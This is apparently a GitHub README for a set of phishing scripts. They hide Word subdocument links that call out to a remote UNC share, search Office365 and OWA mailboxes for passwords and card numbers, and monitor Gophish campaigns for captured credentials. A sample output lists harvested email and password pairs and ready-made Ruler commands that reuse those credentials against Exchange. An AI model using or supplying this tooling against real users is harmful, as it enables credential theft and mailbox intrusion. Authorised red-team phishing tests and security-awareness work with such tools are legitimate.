# phishing-scripts
Some miscellaneous phishing scripts

| Script | Description |
| --- | --- |
| refLinksToWhite.ps1 | This script is to be used with 'subdoc_injector.py' as mentioned in https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-phishing-subdoc/. The script will change the color of Subdoc reference link to 'white' and saves it<br>Example: .\test.ps1 z:\tmp\test.docx \\1.1.1.1\docs\ |
| o365.py | This script search/download emails/attachments matching keywords from Office365 email accounts|  
| gophishauto.py | This script monitors Gophish campaigns and sends out a Slack/Pushover notification when a set of credentials is captured.<br>It displays some statics from the campaign (e.g % of users who read the email/clicked the link/entered credentials as well as who they are).<br> It also displays the list of credentials captured so far.<br>It also tries to determine the OS used by the users based on the User Agent information [some minor bugs pending to be fixed]|
| owaDump<br>https://github.com/milo2012/owaDump | Logins into Outlook Web Access servers and search Email Accounts (OWA) for Passwords, PAN numbers as well as other Keywords|
  
  
  
**Sample output from gophishauto.py**
```
$  python gophishauto3.py -a 212345436346 -i 192.168.0.181 -p 3333 --ssl -n 14 

*** Results from Gophish Campaign - Company1 ***
[*] List of users who read the email
[+] Campaign Status - Company1
Total Targets: 10 (100%) 
Email Unread:  4 (40%)
Email Opened:  6 (60%)
Clicked Link:  3 (30%)
Credentials Captured: 2 (20%)

[+] Credentials Captured from Gophish
Email                               Username                            Password
----------------------------------  ----------------------------------  ------------
xxx@yahoo.com     		    xxx@yahoo.com    			Password1
yyy@yahoo.com   		    yyy@yahoo.com   			Password1

[+] Ruler
./ruler-osx64   --email xxx@yahoo.com -u xxx@yahoo.com -p 'Password1' c
./ruler-osx64   --email yyy@yahoo.com -u yyy@yahoo.com -p 'Password1' c

[*] List of users who read the email
aaa@yahoo.com
bbb@yahoo.com
ccc@yahoo.com
ddd@yahoo.com

[+] List of users who click the link
aaa@yahoo.com
bbb@yahoo.com
ccc@yahoo.com

[+] Unique Browser User Agents (OS Matching)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36 [Mac OS X 10.12.6]
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 [Windows 7]

[+] Browser User Agents
----------------------------------  ------------------------------------------------------------------------------------------------------------------------
xxx@yahoo.com     Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
yyy@yahoo.com  	  Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36
----------------------------------  ------------------------------------------------------------------------------------------------------------------------
```
